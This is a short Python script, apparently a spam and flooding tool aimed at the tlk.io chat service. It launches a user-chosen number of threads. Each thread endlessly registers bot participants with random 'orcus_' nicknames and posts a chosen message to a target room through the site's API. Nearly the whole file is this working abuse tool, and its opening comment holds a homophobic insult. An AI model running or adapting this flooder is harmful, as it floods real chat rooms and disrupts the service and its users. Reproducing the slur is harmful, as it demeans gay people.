#Code by bigboybigboi#0001 skid if ur homosexual (ew)
import requests
import random
import string
import threading


room = input("Room name: ")
id = input("Room ID: ")
msg = input("Message: ")
am = int(input("Thread Amount: "))


def connect(room,id,msg):
  while True:
    s = requests.Session()
    code = ('').join(random.choices(string.ascii_letters + string.digits, k=5))
    payload1 = {
      "nickname" : f"orcus_{code}"
    }
    header1 = {
      "referer" : f"https://tlk.io/{room}"
    }
    payload2 = {
      'body' : f"{msg}",
      'expired' : 'false'
    }
    r1 = s.post("https://tlk.io/api/participant", data=payload1, headers=header1)
    r2 = s.post(f"https://tlk.io/api/chats/{id}/messages", data=payload2, headers=header1)
    if r1.status_code==200:
      print (f"[+] orcus_{code}")


threads = list()
for index in range(am):
  x = threading.Thread(target=connect, args=(room,id,msg))
  threads.append(x)
  x.start()
for index, thread in enumerate(threads):
  thread.join()
